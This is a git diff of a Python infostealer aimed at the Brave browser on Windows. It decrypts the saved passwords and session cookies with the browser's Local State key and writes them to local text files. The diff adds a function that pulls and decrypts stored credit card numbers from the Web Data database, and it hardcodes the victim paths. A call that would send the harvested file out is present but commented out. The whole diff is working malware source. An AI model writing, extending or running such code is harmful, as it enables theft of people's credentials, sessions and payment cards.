@@ -10,6 +10,23 @@ import win32crypt
 import sys
 
 
+##?? use this function?
+def load_path(id):
+    try:
+        with open("todo.txt", "r") as f:
+            lines = f.readlines()
+            dir_path = lines[3].strip()
+            db_path = lines[4]
+            f.close()
+    except:
+        return
+        
+    if id == "dir":
+        return dir_path
+    elif id == "db":
+        return db_path
+##?? use this function?
+
 def delete_file(file):
     try:
         os.remove(file)
@@ -80,23 +97,8 @@ def decrypt_string(string, key):
 ##
 ##Extract passwords
 ##
-  
-def load_path(id):
-    try:
-        with open("todo.txt", "r") as f:
-            lines = f.readlines()
-            dir_path = lines[3].strip()
-            db_path = lines[4]
-            f.close()
-    except:
-        return
-        
-    if id == "dir":
-        return dir_path
-    elif id == "db":
-        return db_path
 
-def save_passwords(db_dir, key_dir):
+def save_passwords(db_dir, keyDir):
     try:
         db_path = os.path.join(os.environ["USERPROFILE"], db_dir)
     except:
@@ -119,21 +121,21 @@ def save_passwords(db_dir, key_dir):
         date_created = row[4]
         last_usage = row[5]
 
-        if username or decrypt_string(row[3], fetch_key(key_dir)):
-            data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_string(row[3], fetch_key(key_dir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
+        if username or decrypt_string(row[3], fetch_key(keyDir)):
+            data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_string(row[3], fetch_key(keyDir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
             store_data("passwords.txt", data)
         else:
             continue
 
     with open("passwords.txt", "a", encoding="utf-8") as f:
-        f.write(f"\n################==Encryption-Key==################\n{fetch_key(key_dir)}")
+        f.write(f"\n################==Encryption-Key==################\n{fetch_key(keyDir)}")
 
     cursor.close()
     db.close()
     delete_file(file)
     #send("passwords.txt")
 
-save_passwords(load_path("db"), load_path("dir"))
+save_passwords(r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
 
 ##
 ##Extract cookies
@@ -166,7 +168,7 @@ fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Netw
 ##Extract encrypted cookies and decrypt them
 ##
 
-def d_fetch_cookies(dir):
+def d_fetch_cookies(dir, keyDir):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
         shutil.copy(file, "cookies.db")
@@ -176,7 +178,7 @@ def d_fetch_cookies(dir):
         cursor = conn.execute(query)
     except:
         pass
-    key = fetch_key(load_path("dir"))
+    key = fetch_key(keyDir)
     try:
         for row in cursor:
             name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
@@ -188,7 +190,7 @@ def d_fetch_cookies(dir):
     except:
         pass
 
-d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
 
 ##
 ##Extract history
@@ -297,3 +299,27 @@ fetch_bookmarks(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bo
 ##Extract credit cards
 ##
 
+def fetch_payment(dir, keyDir):
+    try:
+        file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
+        shutil.copy(file, "autofill.db")
+        
+        conn = sqlite3.connect("autofill.db")
+        query = 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified, use_count, use_date, nickname FROM credit_cards'
+        cursor = conn.execute(query)
+    except:
+        return
+    
+    key = fetch_key(keyDir) #r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
+    try:
+        for row in cursor:
+            name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified, use_count, use_date, nickname = row
+            
+            card = f"\nName: {name_on_card}\nCard Number: {decrypt_string(card_number_encrypted, key)}\nExpires(month, year): {expiration_month}, {expiration_year}\nModified: {date_modified}\nUsage Number: {use_count}\nUse date: {use_date}\nCard Nickname: {nickname}\n"
+            store_data("cards.txt", card)
+        conn.close()
+        delete_file("autofill.db")
+    except:
+        pass
+
+fetch_payment(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
